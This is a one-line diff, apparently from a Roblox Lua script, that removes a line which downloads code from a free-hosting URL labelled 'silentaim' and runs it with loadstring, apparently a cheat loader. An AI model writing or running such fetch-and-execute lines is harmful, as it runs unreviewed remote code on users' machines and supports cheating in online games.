@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://kinpasted.000webhostapp.com/silentaim"))()
